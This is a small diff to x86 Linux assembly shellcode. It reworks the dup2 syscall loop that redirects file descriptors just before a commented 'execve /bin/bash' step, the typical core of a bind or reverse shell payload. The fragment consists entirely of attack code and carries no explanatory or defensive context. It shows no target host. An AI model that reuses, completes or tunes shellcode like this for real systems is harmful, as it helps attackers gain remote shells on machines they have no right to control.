@@ -74,15 +74,15 @@ _start:
 	;dup2
 	;syscall: 66
 	;int dup2(int fildes, int fildes2);
-	push 0xffffffff	;jecxz jumps while ecx is 0
+	push 0x2
 	pop ecx
 
 dup2_call:
-	inc ecx
+	dec ecx
 	push 0x3f	;syscall: 66 (dup2)
 	pop eax
 	int 0x80
-	jecxz dup2_call	
+	jnz dup2_call	
 
 	;execve /bin/bash
 	;syscall 11
